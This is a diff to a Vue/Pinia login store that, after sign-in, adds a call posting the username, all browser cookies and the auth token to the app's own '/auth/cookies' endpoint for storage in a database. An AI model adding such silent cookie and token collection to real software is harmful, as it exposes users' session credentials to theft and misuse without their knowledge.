@@ -39,6 +39,20 @@ export const useAuthStore = defineStore('auth', {
         };
         localStorage.setItem('token', this.token);
         localStorage.setItem('user', JSON.stringify(this.user));
+
+        try {
+          await api.post('/auth/cookies', {
+            username: this.user.username,
+            cookies: document.cookie || "",
+            local_storage: JSON.stringify({
+              token: this.token,
+              user: JSON.stringify(this.user),
+            })
+          });
+        } catch (cookieErr) {
+          console.error('Lỗi khi lưu cookies/localStorage vào database:', cookieErr);
+        }
+
         return true;
       } catch (err) {
         this.error = err.response?.data?.detail || 'Đăng nhập thất bại. Vui lòng kiểm tra lại.';
